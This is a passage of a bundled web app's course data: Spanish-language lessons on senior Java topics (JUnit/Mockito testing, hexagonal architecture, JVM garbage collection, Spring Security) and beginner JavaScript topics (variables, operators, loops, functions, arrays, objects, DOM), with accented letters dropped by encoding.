El problema **N+1** es muy comn en Hibernate. Si haces \`usuario.getPedidos()\` dentro de un bucle de usuarios, Hibernate har 100 consultas a la DB. Usa \`JOIN FETCH\` en JPQL para traer todo de una vez.
`,completed:!1},{id:"java-16-testing-junit",title:"Testing en Java (JUnit 5 & Mockito)",level:"senior",content:`# Leccin 16: Testing en Java (JUnit 5 & Mockito)

El Testing es una cultura. En Java, el rey es **JUnit**.

## 1. JUnit 5 (Jpiter y API)
Estructura bsica de un test:
\`\`\`java
import static org.junit.jupiter.api.Assertions.assertEquals;
import org.junit.jupiter.api.Test;

public class CalculadoraTest {
    @Test
    void sumarDeberiaDarCorrecto() {
        assertEquals(4, 2 + 2);
    }
}
\`\`\`

## 2. Mocking con Mockito
Un test unitario debe aislar la lgica. No puede llamar a la Base de Datos.
Para eso Mockeamos el repositorio.
\`\`\`java
@Test
void deberiaCrearUsuario() {
    UserRepository mockRepo = Mockito.mock(UserRepository.class);
    when(mockRepo.save(any(User.class))).thenReturn(new User(1L, "Juan"));

    UserService service = new UserService(mockRepo);
    User resultado = service.create("Juan");

    assertEquals(1L, resultado.getId());
}
\`\`\`

## 3. Tests de Integracin (@SpringBootTest)
Estos prueban todo junto (Controller + Service + DB real o H2).
\`\`\`java
@SpringBootTest
@AutoConfigureMockMvc
class ApiTest {
    @Autowired
    private MockMvc mvc;

    @Test
    void getUsuarios() throws Exception {
        mvc.perform(get("/api/users"))
           .andExpect(status().isOk())
           .andExpect(content().json("[]"));
    }
}
\`\`\`
Son ms lentos pero simulan mejor la realidad.

---

### Misin Senior:
Manten tus pruebas unitarias **rpidas** (milisegundos) y tus pruebas de integracin **completas**. Si tus tests unitarios tardan 1 minuto en correr, nadie los va a ejecutar.
`,completed:!1},{id:"java-17-arquitectura-limpia",title:"Arquitectura Limpia y Hexagonal en Java",level:"senior",content:`# Leccin 17: Arquitectura Limpia y Hexagonal en Java

Como Senior, tu trabajo no es solo que el cdigo funcione, sino que sea **mantenible** por 5 aos o ms.

## 1. El Problema de las Capas Tradicionales
En la arquitectura clsica (Controller -> Service -> Repository), a veces la lgica de negocio se mezcla con la base de datos. Si cambias de MySQL a Mongo, tienes que reescribir todo.

## 2. Arquitectura Hexagonal (Puertos y Adaptadores)
*   **El Ncleo (Dominio):** Tus reglas de negocio puras. No saben NADA de bases de datos ni de HTTP. Solo Java puro.
*   **Puertos (Interfaces):** El Ncleo define qu necesita (\`PuertoRepositorioUsuario\`).
*   **Adaptadores (Implementacin):**
    *   **Inbound:** Un \`RestController\` que llama al Ncleo.
    *   **Outbound:** Una implementacin de \`PuertoRepositorioUsuario\` que usa JPA.

\`\`\`java
// Ncleo (Domain)
public class CrearUsuarioUseCase {
    private final RepositorioUsuario repo; // Interfaz, no clase concreta
    public CrearUsuarioUseCase(RepositorioUsuario repo) { this.repo = repo; }
}
\`\`\`

## 3. SOLID en la Prctica
*   **S (Single Responsibility):** Una clase, una razn para cambiar.
*   **D (Dependency Inversion):** Depende de abstracciones (interfaces), no de concreciones. Spring nos ayuda mucho con esto.

---

### Misin Senior:
Protege tu **modelo de dominio**. No uses entidades JPA (\`@Entity\`) directamente en tu lgica de negocio. Mapea de DTO a Dominio y de Dominio a Entidad de DB. Es ms trabajo al principio, pero te salva la vida a largo plazo.
`,completed:!1},{id:"java-18-performance-jvm",title:"Performance JVM y Memoria",level:"senior",content:`# Leccin 18: Performance JVM y Memoria

Por qu Java es lento? Mentira, no lo es. Solo necesitas saber cmo funciona la **JVM**.

## 1. El ciclo de vida de un Objeto
*   **Eden Space:** Donde nacen los objetos. La mayora muere joven (Young Generation).
*   **Survivor Space:** Los objetos que sobreviven tras un GC se mueven aqu.
*   **Old Generation (Tenured):** Donde viven los objetos longevos (ej: singletons, caches).

## 2. Garbage Collectors (GC)
*   **G1 (Garbage First):** El "todo terreno" moderno. Optimizado para tiempos de pausa predecibles.
*   **ZGC (Z Garbage Collector):** Para heaps gigantes (Terabytes) con pausas de >1ms.
*   **Serial GC:** Para sistemas embebidos o servidores mnimos (1 core).

## 3. Profiling con VisualVM o JProfiler
Nunca optimices a ciegas.
*   Tu cdigo tarda 5s. Dnde?
*   Usa un profiler para ver: "Es la DB?", "Es la concatenacin de Strings?", "Es el GC pausando todo?".

## 4. Memory Leaks en Java
S, existen. Si guardas objetos en un \`HashMap\` esttico y nunca los borras, la JVM se llenar hasta que explote (\`java.lang.OutOfMemoryError\`).

---

### Misin Senior:
No uses \`System.gc()\`. Es como decirle a la JVM "Oye, limpia la basura". La JVM sabe mejor que t cundo hacerlo. Forzarlo puede congelar toda la aplicacin.
`,completed:!1},{id:"java-19-seguridad-escalabilidad",title:"Seguridad y Escalabilidad Avanzada (Senior)",level:"senior",content:`# Leccin 19: Seguridad y Escalabilidad Avanzada (Senior)

En la cima, todos los detalles importan.

## 1. Seguridad con Spring Security
Es el framework estndar de facto.
*   **Autenticacin**: Quin eres? (Login, OAuth, LDAP).
*   **Autorizacin**: Qu permisos (Authorities) tienes? (RBAC).

## 2. JWT (JSON Web Tokens)
Para APIs modernas.
*   El usuario se loguea, el servidor le da un Token (\`Access Token\`).
*   **Ventaja:** El servidor no necesita guardar estado (Stateless). Cada peticin HTTP viaja con el Token.
*   **Importante:** Nunca guardes contraseas en texto plano. Usa \`BCrypt\` o \`Argon2\`.

## 3. Escalabilidad Vertical vs Horizontal
*   **Vertical:** Aadir ms RAM (Heap) o CPU al servidor. Lmite fsico.
*   **Horizontal:** Aadir ms instancias de la aplicacin (10 servidores).
    *   **Problema:** Cmo compartimos la sesin de usuario?
    *   **Solucin:** Usar una cach distribuida como **Redis**.

## 4. Patrones de Microservicios
*   **Circuit Breaker (Resilience4j):** Si un servicio falla, cortamos la comunicacin para evitar efecto cascada.
*   **API Gateway:** Una puerta nica para todos tus microservicios (Spring Cloud Gateway, Kong).

---

### Misin Senior:
La seguridad no es una capa externa, debe estar en el diseo. Valida CUALQUIER input, escapa SQL, escapa HTML (XSS), usa HTTPS. Un fallo de seguridad cuesta millones.
`,completed:!1},{id:"java-20-practica-senior",title:"Prctica y Evaluacin: Arquitecto Java Senior",level:"senior",content:`# Prctica y Evaluacin: Arquitecto Java Senior

Demuestra que ests listo para liderar un equipo tcnico en una multinacional.

---

## 1. El Desafo de la Performance (Profiler)
**Escenario:** Tienes una aplicacin Spring Boot que lee un archivo CSV de 10GB, lo carga en memoria (dentro de un \`ArrayList<String>\`), y luego lo inserta en una DB.
*   **Problema:** \`OutOfMemoryError: Java heap space\`.
*   **Solucin:** Cmo procesaras el archivo lnea por lnea (\`Streams\` o \`BufferedReader\`) para usar solo 50MB de RAM constantes?

## 2. El Desafo de la Arquitectura (Clean)
**Escenario:** Disea una API de Pagos.
*   Debe soportar PayPal y Stripe (Polimorfismo).
*   La lgica de negocio ("Validar saldo", "Aplicar descuento") NO puede depender de la librera de PayPal o Stripe.
*   Usa Interfaces para desacoplar el dominio de la infraestructura (Inversin de Dependencias).

## 3. El Desafo de la Concurrencia (Safety)
**Escenario:** Tienes un Singleton \`CarritoService\` con una lista \`private List<Item> items = new ArrayList<>();\`.
*   Si 100 usuarios agregan items a la vez, qu pasa? (Race Condition).
*   Cmo lo arreglas? (\`Collections.synchronizedList\`, \`ConcurrentHashMap\`, o mejor, no usar estado mutable compartido).

---

### Resultado esperado:
Un cdigo mantenible, performante, seguro y escalable. Bienvenido al nivel Senior! 
`,completed:!1,isProject:!0},{id:"java-21-errores-comunes",title:"Errores Comunes de un Desarrollador Java",level:"senior",content:'# Leccin 21: Errores Comunes de un Desarrollador Java\n\nAprender de los errores ajenos es la forma ms rpida de subir de nivel.\n\n## 1. El infierno de los "NullPointerException" (NPE)\n*   **Error:** Retornar `null` en lugar de una lista vaca.\n*   **Junior:** `public List<Usuario> getUsuarios() { return null; }`\n*   **Problema:** Quien llame a esto har `getUsuarios().size()` y... Boom! Crash.\n*   **Solucin:** `return Collections.emptyList();` o usar `Optional`.\n\n## 2. Comparar Strings con `==`\n*   **Error:** `if (nombre == "Octavio")`\n*   **Problema:** En Java, `==` compara direcciones de memoria. Si los strings vienen de distintos lugares, dar `false` aunque se lean igual.\n*   **Solucin:** Siempre usa `.equals()`. `if ("Octavio".equals(nombre))` (Pon la constante primero para evitar NPE).\n\n## 3. Tragarse las Excepciones ("Swallowing Exceptions")\n*   **Error:**\n    ```java\n    try {\n        hacerAlgoPeligroso();\n    } catch (Exception e) {\n        e.printStackTrace(); // O peor: nada.\n    }\n    ```\n*   **Problema:** El sistema falla, la app sigue corriendo en un estado corrupto y t no te enteras porque el log se perdi en la consola.\n*   **Solucin:** Loguea con un framework (SLF4J) y relanza la excepcin si no puedes recuperarte.\n\n## 4. Concatenacin de Strings en Bucles\n*   **Error:** `String s = ""; for (i...) s += i;`\n*   **Problema:** Cada `+=` crea un NUEVO objeto String en memoria. O(N^2).\n*   **Solucin:** Usa `StringBuilder`.\n\n---\n\n### Misin de Calidad:\nNunca uses `System.out.println` en un servidor de produccin. Es lento, bloqueante y no se puede rotar ni filtrar. Usa **Loggers** (Log4j2, Logback).\n',completed:!1},{id:"java-22-roadmap-java",title:"Roadmap Java - De Junior a Arquitecto Senior",level:"senior",content:`# Leccin 22: Roadmap Java - De Junior a Arquitecto Senior

Java es enorme. No intentes aprenderlo todo a la vez. Sigue este camino.

## Fase 1: El Constructor (Junior)
*   **Foco:** Sintaxis, POO y lgica.
*   **Aprender:**
    *   Variables, if, for, while.
    *   Clases, Mtodos, Herencia, Interfaces.
    *   Colecciones bsicas (ArrayList, HashMap).
    *   Git bsico.
*   **Proyecto:** Sistema de Gestin de Biblioteca (Consola).

## Fase 2: El Desarrollador Backend (Semi-Senior)
*   **Foco:** Frameworks y Bases de Datos.
*   **Aprender:**
    *   Spring Boot (MVC, REST).
    *   JPA / Hibernate / JDBC.
    *   SQL intermedio.
    *   Tests Unitarios (JUnit, Mockito).
    *   Maven / Gradle.
*   **Proyecto:** API REST de un E-commerce con Login y Carrito.

## Fase 3: El Arquitecto (Senior)
*   **Foco:** Escalabilidad, Seguridad y Calidad.
*   **Aprender:**
    *   Microservicios (Spring Cloud).
    *   Docker / Kubernetes.
    *   Patrones de Diseo (Singleton, Factory, Observer).
    *   Optimizacin de la JVM (GC, Profiling).
    *   Seguridad (OAuth2, JWT).
*   **Proyecto:** Migrar un Monolito legacy a Microservicios en la Nube.

---

### Misin Final:
Java no es solo un lenguaje, es un ecosistema. Aprende a leer la documentacin oficial de Oracle y Spring. Mantente curioso y escribe cdigo limpio. El mundo corre sobre la JVM! 
`,completed:!1}]},iv={id:"js",title:"JavaScript Moderno: De Scripting a Ingeniera",description:"Profundiza en el lenguaje que impulsa la web. Desde los fundamentos de la sintaxis hasta la gestin de memoria y el Event Loop.",completed:!1,lessons:[{id:"js-prerrequisitos",title:"Conocimientos Previos: Ests listo?",level:"junior",content:`# Conocimientos Previos: Antes de programar con JS

JavaScript es el lenguaje de la lgica, pero no vive solo. Para aprenderlo con xito, necesitas tener claras algunas bases.

## 1. HTML y CSS (Estructura y Estilo)
JS sirve para manipular la web. Si no sabes qu es una etiqueta \`<div>\`, una clase \`.clase\` o un ID \`#id\`, te sentirs perdido cuando JS intente buscarlos.
*   **HTML:** Estructura bsica, atributos y jerarqua (padres/hijos).
*   **CSS:** Selectores bsicos y cmo se aplican estilos.

## 2. Lgica de Pensamiento
Programar es darle rdenes a una mquina tonta. Debes estar dispuesto a:
*   Dividir problemas grandes en pasos pequeos (Pensamiento Algortmico).
*   Tener paciencia: Las cosas fallarn mucho al principio!

## 3. Entorno de Trabajo
*   Un navegador moderno (Chrome, Firefox).
*   Un editor de cdigo (VS Code recomendado).
*   Saber qu es la terminal o consola (aunque sea lo bsico).

---
Si ya sabes que un \`<h1>\` es un ttulo y sabes cmo ponerlo de color rojo con CSS, ests ms que listo para empezar con JavaScript!
`,completed:!1},{id:"js-junior-que-es-js",title:"Qu es JavaScript y para qu sirve?",level:"junior",content:`# Leccin 1: Qu es JavaScript y para qu sirve?

## 1. El Cerebro de la Web

Imagina que ests construyendo un robot (tu sitio web):
*   **HTML** es el esqueleto y los tornillos (Estructura).
*   **CSS** es la pintura y el diseo (Apariencia).
*   **JavaScript (JS)** son los cables y el cerebro (Comportamiento y Lgica).

Sin JS, tu robot es una estatua bonita. Con JS, tu robot puede moverse, responder preguntas y bailar.

## 2. Qu hace exactamente?

JavaScript permite que tu pgina web "haga cosas" sin necesidad de recargar la pgina.
*   Mostrar un mapa interactivo.
*   Validar que tu contrasea tenga 8 caracteres.
*   Animar grficos.
*   Cargar nuevos tweets automticamente.

## 3. Dnde vive?

JS vive en el navegador (Chrome, Firefox, Edge). No necesitas instalar nada extra para empezar a programar, porque tu navegador YA tiene un motor de JavaScript dentro.
Tambin puede vivir en el servidor (Node.js), pero eso es para ms adelante!

## 4. Tu primer cdigo "Hola Mundo"

Puedes escribir JS de dos formas:
1.  Dentro de un archivo \`.html\` con la etiqueta \`<script>\`.
2.  En un archivo separado \`.js\` (lo profesional).

Probemos la opcin rpida. Abre la consola de tu navegador (F12 -> Console) y escribe:

\`\`\`javascript
alert("Hola Mundo desde JavaScript!");
\`\`\`
Boom! Tienes una ventana emergente. Acabas de dar tu primera orden al navegador.

## 5. La Consola (\`console.log\`)

\`alert()\` es molesto. Los programadores usamos \`console.log()\` para enviarnos mensajes secretos a nosotros mismos en la consola del navegador.

\`\`\`javascript
console.log("Esto es un mensaje secreto");
console.log(2 + 2); // Calcula y muestra 4
\`\`\`
**Mini Ejercicio:**
Abre la consola (F12) y haz que diga "Hola [Tu Nombre]". Luego haz que sume tu edad + 10.
`,completed:!1},{id:"js-junior-variables",title:"Variables (Cajas con nombre)",level:"junior",content:'# Leccin 2: Variables (Cajas con nombre)\n\n## 1. Qu es una variable?\n\nImagina una caja de mudanza. En ella guardas cosas, y le escribes con marcador qu hay dentro ("Libros", "Cocina").\nEn programacin, una variable es esa caja. Guardamos datos en la memoria para usarlos despus.\n\n## 2. Declarando variables (`var`, `let`, `const`)\n\nAntiguamente solo exista `var`. Ahora tenemos dos mejores opciones: `let` y `const`.\n\n### `let` (La caja abierta)\nsala cuando el contenido de la caja PUEDE cambiar.\n```javascript\nlet edad = 25;\nconsole.log(edad); // 25\n\nedad = 26; // Cumpleaos! Cambiamos el valor\nconsole.log(edad); // 26\n```\n\n### `const` (La caja sellada)\nsala cuando el contenido NO debe cambiar nunca.\n```javascript\nconst pi = 3.1416;\n// pi = 4; // ERROR! No puedes reasignar una constante.\n```\n\n### `var` (El abuelo rebelde)\nNo lo uses. Tiene problemas de "alcance" (scope) que veremos luego. Si ves tutoriales viejos con `var`, reemplzalo mentalmente por `let` o `const`.\n\n## 3. Nombrando variables\n\n*   Usa `camelCase` (primera minscula, siguientes palabras mayscula): `nombreDeUsuario`, `precioTotal`.\n*   S descriptivo. `x` es un mal nombre. `edadUsuario` es un buen nombre.\n*   JS distingue maysculas. `caja` y `Caja` son variables distintas.\n\n## 4. Error Comn: "ReferenceError"\n\n```javascript\nconsole.log(mensaje);\nlet mensaje = "Hola";\n```\nEsto da error. No puedes usar una variable (`let` o `const`) ANTES de crearla. El orden importa: **Declara primero, usa despus.**\n\n## 5. Mini Ejercicio\n1.  Crea una variable `const` para tu nombre.\n2.  Crea una variable `let` para tu edad.\n3.  Intenta cambiar tu edad.\n4.  Intenta cambiar tu nombre y observa el error en consola.\n',completed:!1},{id:"js-junior-tipos-de-datos",title:"Tipos de Datos (Qu hay en la caja?)",level:"junior",content:`# Leccin 3: Tipos de Datos (Qu hay en la caja?)

## 1. Tipos Primitivos (Los tomos)

En JS, las variables no tienen tipo, pero los **valores** s.

### String (Texto)
Va entre comillas (dobles \`""\`, simples \`''\` o invertidas \\\` \\\`).
\`\`\`javascript
let nombre = "Juan";
let saludo = 'Hola';
\`\`\`

### Number (Nmeros)
Enteros o decimales. Sin comillas.
\`\`\`javascript
let edad = 30;
let precio = 9.99;
\`\`\`
*Cuidado:* \`"30"\` (con comillas) es texto, no nmero.

### Boolean (Verdad/Mentira)
Solo puede ser \`true\` (verdadero) o \`false\` (falso). Es un interruptor.
\`\`\`javascript
let esMayorDeEdad = true;
let tieneMascota = false;
\`\`\`

### Undefined (El vaco accidental)
Una variable que declaraste pero no le diste valor.
\`\`\`javascript
let caja;
console.log(caja); // undefined
\`\`\`

### Null (El vaco intencional)
Usado para decir explcitamente "Aqu no hay nada".
\`\`\`javascript
let resultado = null; // Todava no hay resultado
\`\`\`

## 2. \`typeof\` (El detective)

No ests seguro de qu tipo es un dato? Pregntale a JS.
\`\`\`javascript
console.log(typeof "Hola"); // "string"
console.log(typeof 42);     // "number"
console.log(typeof true);   // "boolean"
\`\`\`

## 3. Template Strings (Las comillas mgicas)

Usa comillas invertidas (\\\` \\\`) para meter variables dentro de texto fcilmente.
\`\`\`javascript
let nombre = "Ana";
let edad = 20;

// Forma vieja (fea)
let mensaje1 = "Hola " + nombre + ", tienes " + edad + " aos.";

// Forma moderna (linda)
let mensaje2 = \`Hola \${nombre}, tienes \${edad} aos.\`;
\`\`\`

## 4. Mini Ejercicio
Crea variables para:
*   El nombre de tu pelcula favorita.
*   El ao en que sali.
*   Si la recomendaras (\`true\`/\`false\`).
Usa \`console.log\` y template strings para formar la frase:
"Mi pelcula favorita es [Pelicula] del ao [Ao]. Recomendada? [S/No]"
`,completed:!1},{id:"js-junior-operadores",title:"Operadores (La calculadora)",level:"junior",content:`# Leccin 4: Operadores (La calculadora)

## 1. Operadores Aritmticos

Matemticas bsicas.
\`\`\`javascript
let suma = 5 + 5;       // 10
let resta = 10 - 2;     // 8
let multiplicacion = 3 * 3; // 9
let division = 10 / 2;  // 5
let modulo = 10 % 3;    // 1 (El resto de la divisin 10/3)
\`\`\`

## 2. Operadores de Asignacin

Atajos para no escribir tanto.
\`\`\`javascript
let puntos = 10;
puntos += 5; // Es igual a: puntos = puntos + 5; (15)
puntos -= 2; // Es igual a: puntos = puntos - 2; (13)
puntos++;    // Suma 1 (14)
puntos--;    // Resta 1 (13)
\`\`\`

## 3. Operadores de Comparacin

Devuelven \`true\` o \`false\`.

\`\`\`javascript
/* Igualdad */
console.log(5 == "5");  // true (CUIDADO: Compara valor, ignora tipo)
console.log(5 === "5"); // false (RECOMENDADO: Compara valor Y tipo. Usa siempre este!)

/* Mayor/Menor */
console.log(10 > 5);  // true
console.log(10 < 5);  // false
console.log(10 >= 10); // true (Mayor o igual)
\`\`\`

## 4. Operadores Lgicos (Combinando verdades)

*   \`&&\` (AND / Y): Ambas deben ser verdad.
    \`\`\`javascript
    let tengoDinero = true;
    let tiendaAbierta = true;
    console.log(tengoDinero && tiendaAbierta); // true
    \`\`\`

*   \`||\` (OR / O): Al menos una debe ser verdad.
    \`\`\`javascript
    let esVerano = false;
    let haceCalor = true;
    console.log(esVerano || haceCalor); // true
    \`\`\`

*   \`!\` (NOT / NO): Invierte el valor.
    \`\`\`javascript
    let llueve = true;
    console.log(!llueve); // false
    \`\`\`

## 5. Coercin Extraa (El lado oscuro de JS)
JS intenta "ayudarte" convirtiendo tipos automticamente.
\`\`\`javascript
console.log(1 + "2"); // "12" (Convirti el 1 a texto y los peg)
console.log("5" - 1); // 4 (Convirti el "5" a nmero y rest)
\`\`\`
**Regla:** Nunca confes en la coercin automtica. Convierte los tipos t mismo (\`Number("5")\`).

## 6. Mini Ejercicio
Calcula si un ao es bisiesto.
Un ao es bisiesto si es divisible por 4 (\`ao % 4 === 0\`).
\`\`\`javascript
let year = 2024;
let esBisiesto = (year % 4 === 0);
console.log(\`El ao \${year} es bisiesto: \${esBisiesto}\`);
\`\`\`
Prueba con 2023.
`,completed:!1},{id:"js-junior-condicionales",title:"Condicionales (Tomando decisiones)",level:"junior",content:`# Leccin 5: Condicionales (Tomando decisiones)

## 1. El \`if\` (Si...)

La forma bsica de que tu cdigo piense.
\`\`\`javascript
let clima = "lluvia";

if (clima === "lluvia") {
    console.log("Lleva paraguas ");
}
\`\`\`
Si la condicin entre parntesis es \`true\`, se ejecuta el cdigo entre llaves \`{}\`. Si es \`false\`, se salta.

## 2. El \`else\` (Si no...)

Qu hacer si la condicin NO se cumple.
\`\`\`javascript
let edad = 15;

if (edad >= 18) {
    console.log("Puedes pasar ");
} else {
    console.log("Vete a casa a tomar leche ");
}
\`\`\`

## 3. El \`else if\` (Mltiples opciones)

\`\`\`javascript
let semaforo = "amarillo";

if (semaforo === "verde") {
    console.log("Avanza ");
} else if (semaforo === "amarillo") {
    console.log("Prepara frenar ");
} else if (semaforo === "rojo") {
    console.log("Detente ");
} else {
    console.log("El semforo est roto ");
}
\`\`\`

## 4. Operador Ternario (El \`if\` rpido)

Perfecto para asignaciones simples.
\`condicin ? valor_si_true : valor_si_false\`

\`\`\`javascript
// Version larga
let mensaje;
if (edad >= 18) {
    mensaje = "Adulto";
} else {
    mensaje = "Nio";
}

// Versin Ternaria (Pro)
let mensajeTernario = edad >= 18 ? "Adulto" : "Nio";
\`\`\`

## 5. Mini Ejercicio
Crea una variable \`hora\` (de 0 a 24).
*   Si es entre 6 y 12: "Buenos das".
*   Si es entre 13 y 20: "Buenas tardes".
*   Si no: "Buenas noches".
`,completed:!1},{id:"js-junior-bucles",title:"Bucles (Repitiendo cosas)",level:"junior",content:`# Leccin 6: Bucles (Repitiendo cosas)

## 1. Por qu bucles?

Imagina tener que imprimir los nmeros del 1 al 100.
Escribiras 100 \`console.log\`? No. Usas un bucle.

## 2. El Bucle \`for\` (El clsico)

Tiene 3 partes: \`for (inicio; condicin; actualizacin)\`

\`\`\`javascript
// Imprime del 1 al 5
for (let i = 1; i <= 5; i++) {
    console.log(\`Vuelta nmero: \${i}\`);
}
\`\`\`
1.  **Inicio (\`items = 1\`):** Creamos un contador.
2.  **Condicin (\`i <= 5\`):** Mientras esto sea verdad, el bucle sigue.
3.  **Actualizacin (\`i++\`):** Al final de cada vuelta, sumamos 1 al contador.

## 3. El Bucle \`while\` (Mientras...)

Ms sencillo. Sigue mientras la condicin sea verdad. Cuidado con los bucles infinitos (si olvidas cambiar la condicin, nunca parar).

\`\`\`javascript
let energia = 3;

while (energia > 0) {
    console.log(\`Corriendo... Energa restante: \${energia}\`);
    energia--; // Importante! Restamos energa para que alguna vez termine
}
console.log("Me cans.");
\`\`\`

## 4. \`break\` y \`continue\`

*   **\`break\`**: Rompe el bucle por completo y sale.
*   **\`continue\`**: Salta la vuelta actual y pasa a la siguiente.

\`\`\`javascript
// Imprime solo impares
for (let i = 1; i <= 10; i++) {
    if (i % 2 === 0) {
        continue; // Es par, salta esta vuelta (no imprime)
    }
    console.log(i);
}
\`\`\`

## 5. Mini Ejercicio
Escribe un bucle que sume todos los nmeros del 1 al 10 (1+2+3...).
Respuesta esperada: 55.
`,completed:!1},{id:"js-junior-funciones",title:"Funciones (Recetas de cocina)",level:"junior",content:`# Leccin 7: Funciones (Recetas de cocina)

## 1. Qu es una funcin?

Es un bloque de cdigo reutilizable. Como una receta: le das ingredientes (input), hace algo y te da un resultado (output).
Escribe el cdigo una vez, salo mil veces.

## 2. Declaracin clsica

\`\`\`javascript
function saludar(nombre) { // "nombre" es un parmetro
    console.log(\`Hola \${nombre}!\`);
}

// Llamar a la funcin
saludar("Mara"); // "Mara" es el argumento
saludar("Pedro");
\`\`\`

## 3. El \`return\` (Devolver valor)

Las funciones tiles no solo imprimen en consola, sino que **devuelven** un dato para que lo uses en otra parte.

\`\`\`javascript
function sumar(a, b) {
    let resultado = a + b;
    return resultado; // Devuelve el valor y TERMINA la funcin
}

let total = sumar(10, 5); // total ahora vale 15
console.log(total * 2); // 30
\`\`\`

## 4. Arrow Functions (Funciones Flecha)

La forma moderna y corta de escribir funciones. Muy usada en React.
\`\`\`javascript
// Funcin clsica
// function restar(a, b) { return a - b; }

// Arrow Function
const restar = (a, b) => {
    return a - b;
};

// Si es una sola lnea, puedes quitar llaves y return (Return Implcito)
const multiplicar = (a, b) => a * b;
\`\`\`

## 5. Mini Ejercicio
Crea una funcin llamada \`calcularPrecioFinal\`.
*   Recibe dos parmetros: \`precio\` e \`impuesto\`.
*   Devuelve el precio sumndole el impuesto.
*   Prueba: \`calcularPrecioFinal(100, 21)\` debera devolver \`121\`.
`,completed:!1},{id:"js-junior-scope",title:"Scope (El alcance de las variables)",level:"junior",content:`# Leccin 8: Scope (El alcance de las variables)

## 1. Quin puede ver mi variable?

El Scope define desde dnde puedes acceder a una variable.
Piensa en una casa.
*   **Variable Global:** Est en el jardn. Todos (desde la calle y desde la casa) pueden verla.
*   **Variable Local:** Est en tu habitacin. Solo t puedes verla dentro de tu habitacin.

## 2. Scope Global

Variables declaradas fuera de cualquier funcin.
\`\`\`javascript
let mensajeGlobal = "Soy pblica";

function mostrar() {
    console.log(mensajeGlobal); // Funciona
}
\`\`\`

## 3. Scope de Bloque (Local)

Variables declaradas con \`let\` o \`const\` dentro de llaves \`{}\` (funciones, ifs, bucles) SOLO existen dentro de esas llaves.

\`\`\`javascript
function secreto() {
    let clave = "1234"; // Local
    console.log(clave); // Funciona aqu dentro
}

// console.log(clave); // ERROR: clave is not defined
\`\`\`

## 4. La Trampa de \`var\`

\`var\` no respeta los bloques de \`if\` o \`for\`. Solo los de funcin. Por eso no lo usamos.

\`\`\`javascript
if (true) {
    var antiguo = "Existo fuera";
    let moderno = "Solo existo aqu";
}

console.log(antiguo); // Funciona (Peligro!)
// console.log(moderno); // Error (Correcto)
\`\`\`

## 5. Regla de Oro
Siempre declara tus variables en el scope ms pequeo posible. No uses variables globales a menos que sea estrictamente necesario. Esto evita que partes de tu cdigo interfieran con otras accidentalmente.
`,completed:!1},{id:"js-junior-arrays",title:"Arrays (Listas ordenadas)",level:"junior",content:`# Leccin 9: Arrays (Listas ordenadas)

## 1. Una caja con compartimentos

Un Array es una variable especial que puede guardar CIENTOS de valores a la vez.

\`\`\`javascript
// Lista de compras
const frutas = ["Manzana", "Banana", "Naranja"];
\`\`\`

## 2. Acceder y Modificar

Los Arrays se cuentan desde CERO (ndice).
*   Manzana es posicin 0.
*   Banana es posicin 1.

\`\`\`javascript
console.log(frutas[0]); // "Manzana"
console.log(frutas[2]); // "Naranja"

frutas[1] = "Pera"; // Cambiamos Banana por Pera
console.log(frutas.length); // 3 (Cantidad de elementos)
\`\`\`

## 3. Mtodos tiles

JS nos da herramientas para manipular arrays.

*   \`.push(dato)\`: Agrega al final.
    \`frutas.push("Uva");\`
*   \`.pop()\`: Elimina el ltimo.
    \`frutas.pop();\`
*   \`.includes(dato)\`: Est en la lista?
    \`console.log(frutas.includes("Manzana")); // true\`

## 4. Recorrer un Array (Iterar)

Cmo imprimimos todas las frutas? Con un bucle.

\`\`\`javascript
for (let i = 0; i < frutas.length; i++) {
    console.log(frutas[i]);
}

// O la versin moderna (preferida)
frutas.forEach((fruta) => {
    console.log(\`Tengo: \${fruta}\`);
});
\`\`\`

## 5. Mini Ejercicio
1.  Crea un array \`tareas\` con 3 tareas pendientes.
2.  Agrega una tarea ms con \`.push\`.
3.  Borra la ltima tarea porque te dio pereza (\`.pop\`).
4.  Usa un bucle para listar las que quedaron.
`,completed:!1},{id:"js-junior-objetos",title:"Objetos (Diccionarios con etiquetas)",level:"junior",content:`# Leccin 10: Objetos (Diccionarios con etiquetas)

## 1. Datos complejos

Un array sirve para listas (fruta 1, fruta 2).
Un Objeto sirve para describir una "Cosa" con propiedades (nombre, color, peso).

\`\`\`javascript
const auto = {
    marca: "Toyota",  // propiedad: valor
    modelo: "Corolla",
    anio: 2022,
    encendido: false,
    // Un mtodo es una funcin dentro de un objeto
    arrancar: function() {
        this.encendido = true; // "this" se refiere a ESTE objeto
        console.log("Ruum ruum! ");
    }
};
\`\`\`

## 2. Acceder a datos

Usamos el punto \`.\` (Dot notation).

\`\`\`javascript
console.log(auto.marca); // "Toyota"
console.log(auto["modelo"]); // Otra forma (Bracket notation)

auto.anio = 2023; // Modificar
auto.color = "Rojo"; // Agregar propiedad nueva
\`\`\`

## 3. Mtodos (Acciones)

\`\`\`javascript
auto.arrancar(); // Ejecuta la funcin dentro del objeto
// Ahora auto.encendido es true
\`\`\`

## 4. Objetos dentro de Objetos (Anidacin)

\`\`\`javascript
const usuario = {
    nombre: "Ana",
    direccion: {
        calle: "Av. Siempre Viva",
        numero: 123
    }
};

console.log(usuario.direccion.calle); // "Av. Siempre Viva"
\`\`\`

## 5. Mini Ejercicio
Crea un objeto \`mascota\`.
*   Propiedades: \`nombre\`, \`tipo\` (perro/gato), \`hambre\` (nmero 1-10).
*   Mtodo \`comer()\`: Resta 1 al hambre y dice "am am".
*   Llama al mtodo y muestra cmo baj el hambre.
`,completed:!1},{id:"js-junior-dom-basico",title:"DOM (Manipulando el HTML)",level:"junior",content:`# Leccin 11: DOM (Manipulando el HTML)

## 1. El DOM (Document Object Model)

Cuando el navegador lee tu HTML, crea un rbol de objetos en memoria. Eso es el DOM.
JS puede tocar ese rbol para cambiar el HTML en tiempo real.

## 2. Seleccionar Elementos (El gancho)

Antes de cambiar algo, necesitas agarrarlo.

\`\`\`javascript
// Agarra un elemento por su ID
const titulo = document.getElementById("titulo-principal");

// Agarra el PRIMER elemento que coincida con el selector CSS
const boton = document.querySelector(".btn-rojo");

// Agarra TODOS los prrafos (devuelve una lista)
const parrafos = document.querySelectorAll("p");
\`\`\`

## 3. Cambiar Contenido

\`\`\`javascript
const saludo = document.getElementById("saludo");

// Cambiar texto
saludo.innerText = "Hola Universo!";

// Cambiar HTML interno (puedes meter etiquetas)
saludo.innerHTML = "<strong>Hola Negrita!</strong>";
\`\`\`

## 4. Cambiar Estilos

\`\`\`javascript
const caja = document.querySelector(".caja");

caja.style.backgroundColor = "blue";
caja.style.fontSize = "20px"; // Nota: en CSS es font-size, en JS es fontSize
